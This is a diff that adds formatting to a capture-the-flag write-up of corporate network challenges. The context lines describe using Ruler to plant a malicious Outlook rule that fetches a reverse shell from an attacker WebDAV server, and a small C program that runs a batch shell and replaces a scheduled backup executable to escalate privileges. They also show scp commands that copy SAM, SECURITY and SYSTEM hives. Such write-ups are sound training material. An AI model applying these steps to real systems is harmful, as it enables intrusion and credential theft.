@@ -219,7 +219,7 @@ And that's the flag for the second corporate challenge!
 
 In this challenge, we are told that another user on the FTP server has a SMB file share mounted. Additionally, we have to compromise the mail server (also seen in the original DNS results as mail.tictoc.cysca).
 
-We find an Outlook WebApp server running on the mail server at: https://172.16.5.25/owa/auth/logon.aspx
+We find an Outlook WebApp server running on the mail server at: `https://172.16.5.25/owa/auth/logon.aspx`
 
 To get credentials for this server, we first look to confirm that an SMB connection is already established on the server:
 
@@ -254,7 +254,7 @@ Googling a bit on using outlook client access to gain a shell, we come across a 
 
 "Ruler is a tool that allows you to interact with Exchange servers remotely, through either the MAPI/HTTP or RPC/HTTP protocol. The main aim is abuse the client-side Outlook features and gain a shell remotely."
 
-So, to summarise, we can use create a malicious outlook rule for the user to execute code / start an application on the user's machine. The attack involves starting a WebDAV server on our attacker machine to serve an executable or script, and a reverse shell listener. We use ruler to create a malicious outlook rule to fetch our reverse shell executable / script from our WebDAV server and then send an email to the user to trigger the rule.
+So, to summarise, we can use **create a malicious outlook rule for the user to execute code / start an application on the user's machine**. The attack involves starting a WebDAV server on our attacker machine to serve an executable or script, and a reverse shell listener. We use ruler to create a malicious outlook rule to fetch our reverse shell executable / script from our WebDAV server and then send an email to the user to trigger the rule.
 
 So let's start Powershell Empire, set up a listener and create a batch script reverse shell:
 ```c {hl_lines=[1,2,4,5,6,8,9,10]}
@@ -335,7 +335,7 @@ There we go!
 
 This challenge asks us to get root on madisonw's machine.
 
-We enumerate the machine looking for ways to escalate our privileges to Administrator. We could use scripts like PowerUp or JAWS to find vectors, however looking at some files on the filesystem showed us clues. Specifically, there was an AutoBackup folder in the root C:/ drive folder. This hints towards a backup script running automatically in the background, possibly in a scheduled task. Looking through the scheduled tasks on the machine, we find one interesting one:
+We enumerate the machine looking for ways to escalate our privileges to Administrator. We could use scripts like `PowerUp` or `JAWS` to find vectors, however looking at some files on the filesystem showed us clues. Specifically, there was an `AutoBackup` folder in the root `C:/` drive folder. This hints towards a backup script running automatically in the background, possibly in a scheduled task. Looking through the scheduled tasks on the machine, we find one interesting one:
 
 ```c {hl_lines=[1]}
 (Empire: SDE3VALZ2GNZBZMT) > shell schtasks /Query /tn "Run Backup Madison" /V /fo LIST
@@ -357,7 +357,7 @@ Power Management:                     Stop On Battery Mode
 Run As User:                          madisonw
 ```
 
-This scheduled task seems to execute a powershell script called ```RunBackup.ps1``` in the AutoBackup folder, but it runs as the madisonw user. Let's have a look at this powershell script:
+This scheduled task seems to execute a powershell script called ```RunBackup.ps1``` in the `AutoBackup` folder, but it runs as the `madisonw` user. Let's have a look at this powershell script:
 
 ```powershell {hl_lines=[1]}
 (Empire: SDE3VALZ2GNZBZMT) > cat RunBackup.ps1
@@ -416,7 +416,7 @@ Great! So we can change the executable to our own executable. However, we still 
 
 First, we can create our own malicious executable as follows:
 
-```c {hl_lines=[1]}
+```c {hl_lines=[1,9]}
 $ cat Dev-backup.c
 #include &lt;stdio.h>
 #include &lt;stdlib.h>
@@ -425,7 +425,7 @@ int main() {
     system("c:\\Users\\madisonw\\Documents\\shell.bat");
     return 0;
 }
-# i686-w64-mingw32-gcc Dev-Backup.c -o Backup.exe
+$ i686-w64-mingw32-gcc Dev-Backup.c -o Backup.exe
 ```
 
 In the above, we create a C script which will execute a batch script. We will eventually upload this ```shell.bat``` to madisonw's Documents folder so that our malicious ```Backup.exe``` can find it. Note that the compiler I used to compile the c script into an executable can be installed on Kali using ```apt-get install gcc-mingw-w64-i686```.
@@ -667,7 +667,7 @@ This folder contains the core file backups from the Domain Controllers.
 This was setup in the event migration to a new Windows Server version Failed.
 ```
 
-It looks like there are core Windows files stored in this Backups folder! We can use the following commands to copy the DC and BackupDC's SAM, SECURITY and SYSTEM files to our local kali machine:
+It looks like there are core Windows files stored in this Backups folder! We can use the following commands to copy the DC and BackupDC's `SAM`, `SECURITY` and `SYSTEM` files to our local kali machine:
 
 ```c
 $ scp -P 2222 root@127.0.0.1:/BACKUPS/DC/SAM . 
